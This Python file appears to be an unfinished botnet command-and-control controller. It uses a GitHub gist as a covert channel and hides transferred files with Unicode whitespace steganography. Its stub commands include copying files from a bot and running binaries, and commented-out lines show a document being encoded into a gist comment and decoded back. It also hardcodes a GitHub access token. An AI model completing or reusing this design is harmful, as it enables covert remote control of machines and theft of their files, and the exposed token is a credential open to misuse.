import threading, time
from github import Github
import pyUnicodeSteganography as usteg
import lorem

print(f"Hello, welcome to the bot controller. Possible commands are:\n\
    w - get listing of currently logged users\n \
    ls <path> - get a listing of a paritcular directory\n \
    id - get id of current user\n \
    cp <full_path_to_the_file> - copy a file from bot to the controller\n \
    ex <full_path_to_the_binary>\n\n")

g = Github("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")
gist = g.get_gist('16f8ed1319b10a550451060d5a56d493')


# secret_msg = "secret"
# encoded = usteg.encode(text, secret_msg)

# with open('cv01.docx', 'rb') as f:
#     data = f.read()
#     enc = usteg.encode(text, data, binary=True, method='snow')

# gist.create_comment(enc)

# comments = gist.get_comments()

# dc = usteg.decode(comments[2].body, method='snow', binary=True)

# with open('bvack.docx', 'wb') as f:
#     f.write(dc)

# for ch in encoded:
#     print(ch.encode('utf-8'))

def send_command(args):
    if args[0] == "w":
        pass
    elif args[0] == "ls" and len(args) > 1:
        pass
    elif args[0] == "id":
        pass
    elif args[0] == "cp" and len(args) > 1:
        pass
    elif args[0] == "ex" and len(args) > 1:
        pass
    else:
        print("Sorry unknown command or incorrect number of arguments")


def get_responses():
    print("\nresponse")
    threading.Timer(5, get_responses).start()

# get_responses()

while True:
    command = input("Enter command: ")
    if len(command) > 0:
        send_command(command.split())
    else:
        print("No command supplied")
